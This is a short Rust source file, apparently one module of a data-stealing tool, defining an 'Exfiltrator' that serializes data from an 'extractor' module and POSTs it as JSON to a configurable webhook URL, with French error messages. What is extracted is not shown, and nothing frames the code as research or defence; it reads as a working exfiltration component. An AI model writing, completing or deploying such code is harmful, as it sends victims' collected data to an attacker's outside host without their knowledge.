use reqwest::Client;
use crate::extractor::ExtractedData;
use serde_json::Value;

pub struct Exfiltrator {
    webhook_url: String,
    client: Client,
}

impl Exfiltrator {
    pub fn new(webhook_url: &str) -> Self {
        Exfiltrator {
            webhook_url: webhook_url.to_string(),
            client: Client::new(),
        }
    }

    pub async fn send_data(&self, data: &ExtractedData) -> Result<Value, String> {
        let payload = serde_json::to_value(data)
            .map_err(|e| format!("Erreur de sérialisation JSON : {}", e))?;

        let resp = self.client
            .post(&self.webhook_url)
            .json(&payload)
            .send()
            .await
            .map_err(|e| format!("Erreur réseau lors de l'envoi : {}", e))?;

        if resp.status().is_success() {
            Ok(payload)
        } else {
            Err(format!("Échec (HTTP {}).", resp.status()))
        }
    }
}
